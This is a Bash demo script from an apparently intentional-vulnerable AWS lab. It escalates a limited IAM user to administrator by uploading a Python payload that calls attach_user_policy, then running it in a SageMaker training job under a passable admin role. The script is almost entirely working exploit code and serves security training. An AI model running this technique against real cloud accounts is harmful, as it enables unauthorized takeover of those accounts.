#!/bin/bash

# Demo script for iam-passrole+sagemaker-createtrainingjob privilege escalation
# This scenario demonstrates how a user with iam:PassRole and sagemaker:CreateTrainingJob
# can escalate privileges by creating a training job with a malicious script that grants admin access


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-sagemaker-002-to-admin-starting-user"
PASSABLE_ROLE_NAME="pl-prod-sagemaker-002-to-admin-passable-role"
TRAINING_JOB_NAME="pl-demo-training-$(date +%s)"
EXPLOIT_SCRIPT="exploit.py"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}SageMaker CreateTrainingJob Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_sagemaker_002_iam_passrole_sagemaker_createtrainingjob.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_name')
PASSABLE_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.passable_role_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "S3 Bucket: $BUCKET_NAME"
echo "Passable Role ARN: $PASSABLE_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd aws sts get-caller-identity --query 'Arn' --output text
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd aws sts get-caller-identity --query 'Account' --output text
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd aws iam list-users --max-items 1
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Create malicious training script
echo -e "${YELLOW}Step 5: Creating malicious training script${NC}"
cat > /tmp/$EXPLOIT_SCRIPT << EOF
#!/usr/bin/env python3
import boto3
import os

# This script runs with the admin role's privileges during SageMaker training
print("Starting privilege escalation script...")

# Create IAM client
iam = boto3.client('iam')

# Attach AdministratorAccess policy to the starting user
try:
    iam.attach_user_policy(
        UserName='${STARTING_USER}',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    print("Successfully attached AdministratorAccess policy to ${STARTING_USER}")
except Exception as e:
    print(f"Error attaching policy: {e}")

print("Privilege escalation complete!")
EOF

echo "Created exploit script: /tmp/$EXPLOIT_SCRIPT"
echo -e "${GREEN}✓ Malicious training script created${NC}\n"

# Step 6: Package and upload the exploit script to S3
echo -e "${YELLOW}Step 6: Packaging and uploading exploit script to S3${NC}"

# SageMaker training jobs expect code to be packaged as a tar.gz file
echo "Creating source.tar.gz package..."
cd /tmp
tar -czf sourcedir.tar.gz $EXPLOIT_SCRIPT
cd - > /dev/null

echo "Uploading to: s3://$BUCKET_NAME/sourcedir.tar.gz"
show_cmd aws s3 cp /tmp/sourcedir.tar.gz s3://$BUCKET_NAME/sourcedir.tar.gz
aws s3 cp /tmp/sourcedir.tar.gz s3://$BUCKET_NAME/sourcedir.tar.gz

echo -e "${GREEN}✓ Exploit script packaged and uploaded to S3${NC}\n"

# Step 7: Get SageMaker PyTorch container image URI for the region
echo -e "${YELLOW}Step 7: Determining SageMaker container image${NC}"

# Map of region to ECR account ID for SageMaker containers
# Reference: https://docs.aws.amazon.com/sagemaker/latest/dg/ecr-us-east-1.html
case $AWS_REGION in
    us-east-1|us-east-2|us-west-1|us-west-2)
        ECR_ACCOUNT="763104351884"
        ;;
    ca-central-1)
        ECR_ACCOUNT="763104351884"
        ;;
    eu-west-1|eu-west-2|eu-west-3|eu-central-1|eu-north-1)
        ECR_ACCOUNT="763104351884"
        ;;
    ap-south-1|ap-northeast-1|ap-northeast-2|ap-southeast-1|ap-southeast-2)
        ECR_ACCOUNT="763104351884"
        ;;
    sa-east-1)
        ECR_ACCOUNT="763104351884"
        ;;
    *)
        ECR_ACCOUNT="763104351884"  # Default to standard account
        ;;
esac

# Determine regional ECR domain
if [[ $AWS_REGION == cn-* ]]; then
    ECR_DOMAIN="amazonaws.com.cn"
else
    ECR_DOMAIN="amazonaws.com"
fi

CONTAINER_IMAGE="${ECR_ACCOUNT}.dkr.ecr.${AWS_REGION}.${ECR_DOMAIN}/pytorch-training:2.0.0-cpu-py310"
echo "Container image: $CONTAINER_IMAGE"
echo -e "${GREEN}✓ Container image determined${NC}\n"

# Step 8: Create SageMaker training job with admin role
echo -e "${YELLOW}Step 8: Creating SageMaker training job with admin role${NC}"
echo "Training job name: $TRAINING_JOB_NAME"
echo "Using role: $PASSABLE_ROLE_ARN"
echo "This will take 3-5 minutes to provision and execute..."
echo ""

show_attack_cmd aws sagemaker create-training-job --region $AWS_REGION --training-job-name $TRAINING_JOB_NAME --role-arn $PASSABLE_ROLE_ARN --algorithm-specification "{\"TrainingImage\": \"$CONTAINER_IMAGE\", \"TrainingInputMode\": \"File\"}" --input-data-config "[{\"ChannelName\": \"training\", \"DataSource\": {\"S3DataSource\": {\"S3DataType\": \"S3Prefix\", \"S3Uri\": \"s3://$BUCKET_NAME\", \"S3DataDistributionType\": \"FullyReplicated\"}}}]" --output-data-config "{\"S3OutputPath\": \"s3://$BUCKET_NAME/output\"}" --resource-config "{\"InstanceType\": \"ml.m5.large\", \"InstanceCount\": 1, \"VolumeSizeInGB\": 10}" --stopping-condition "{\"MaxRuntimeInSeconds\": 600}" --hyper-parameters "{\"sagemaker_program\": \"$EXPLOIT_SCRIPT\", \"sagemaker_submit_directory\": \"s3://$BUCKET_NAME/sourcedir.tar.gz\"}"
aws sagemaker create-training-job \
    --region $AWS_REGION \
    --training-job-name $TRAINING_JOB_NAME \
    --role-arn $PASSABLE_ROLE_ARN \
    --algorithm-specification '{
        "TrainingImage": "'$CONTAINER_IMAGE'",
        "TrainingInputMode": "File"
    }' \
    --input-data-config '[{
        "ChannelName": "training",
        "DataSource": {
            "S3DataSource": {
                "S3DataType": "S3Prefix",
                "S3Uri": "s3://'$BUCKET_NAME'",
                "S3DataDistributionType": "FullyReplicated"
            }
        }
    }]' \
    --output-data-config '{
        "S3OutputPath": "s3://'$BUCKET_NAME'/output"
    }' \
    --resource-config '{
        "InstanceType": "ml.m5.large",
        "InstanceCount": 1,
        "VolumeSizeInGB": 10
    }' \
    --stopping-condition '{
        "MaxRuntimeInSeconds": 600
    }' \
    --hyper-parameters '{
        "sagemaker_program": "'$EXPLOIT_SCRIPT'",
        "sagemaker_submit_directory": "s3://'$BUCKET_NAME'/sourcedir.tar.gz"
    }'

echo -e "${GREEN}✓ Training job created successfully${NC}\n"

# Step 9: Wait for training job to complete
echo -e "${YELLOW}Step 9: Waiting for training job to complete${NC}"
echo "This typically takes 3-5 minutes..."
echo "Status updates every 30 seconds:"
echo ""

MAX_WAIT_SECONDS=600  # 10 minutes timeout
ELAPSED=0

while [ $ELAPSED -lt $MAX_WAIT_SECONDS ]; do
    STATUS=$(aws sagemaker describe-training-job \
        --region $AWS_REGION \
        --training-job-name $TRAINING_JOB_NAME \
        --query 'TrainingJobStatus' \
        --output text)

    echo "  [$(date +%H:%M:%S)] Training job status: $STATUS"

    if [ "$STATUS" == "Completed" ]; then
        echo -e "${GREEN}✓ Training job completed successfully!${NC}\n"
        break
    elif [ "$STATUS" == "Failed" ] || [ "$STATUS" == "Stopped" ]; then
        echo -e "${RED}✗ Training job failed or was stopped${NC}"

        # Get failure reason if available
        FAILURE_REASON=$(aws sagemaker describe-training-job \
            --region $AWS_REGION \
            --training-job-name $TRAINING_JOB_NAME \
            --query 'FailureReason' \
            --output text 2>/dev/null || echo "No failure reason available")

        if [ "$FAILURE_REASON" != "None" ] && [ -n "$FAILURE_REASON" ]; then
            echo "Failure reason: $FAILURE_REASON"
        fi

        exit 1
    fi

    sleep 30
    ELAPSED=$((ELAPSED + 30))
done

if [ $ELAPSED -ge $MAX_WAIT_SECONDS ]; then
    echo -e "${RED}✗ Timeout waiting for training job to complete${NC}"
    exit 1
fi

# Step 10: Wait for IAM policy propagation
echo -e "${YELLOW}Step 10: Waiting for IAM policy changes to propagate${NC}"
echo "Waiting 15 seconds for policy to propagate..."
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# Step 11: Verify administrator access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."
echo ""

show_cmd aws iam list-users --max-items 3 --output table
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "The training job may have failed to attach the policy."
    echo "Check CloudWatch logs for the training job for more details."
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Created malicious Python training script"
echo "3. Uploaded script to S3 bucket: $BUCKET_NAME"
echo "4. Created SageMaker training job: $TRAINING_JOB_NAME"
echo "5. Passed admin role to training job: $PASSABLE_ROLE_NAME"
echo "6. Training job executed script with admin privileges"
echo "7. Script attached AdministratorAccess policy to starting user"
echo "8. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → PassRole + CreateTrainingJob"
echo "  → Training Job with $PASSABLE_ROLE_NAME (Admin)"
echo "  → Execute malicious script → Admin Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts Created:${NC}"
echo "- Training job: $TRAINING_JOB_NAME (auto-cleaned after completion)"
echo "- S3 object: s3://$BUCKET_NAME/$EXPLOIT_SCRIPT"
echo "- IAM policy attachment: AdministratorAccess → $STARTING_USER"
echo "- Local file: /tmp/$EXPLOIT_SCRIPT"

echo -e "\n${YELLOW}MITRE ATT&CK Techniques:${NC}"
echo "- T1098.001 - Account Manipulation: Additional Cloud Credentials"
echo "- T1548.005 - Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access"
echo "- T1078.004 - Valid Accounts: Cloud Accounts"

echo -e "\n${RED}⚠ Warning: This demo has attached AdministratorAccess to the starting user${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
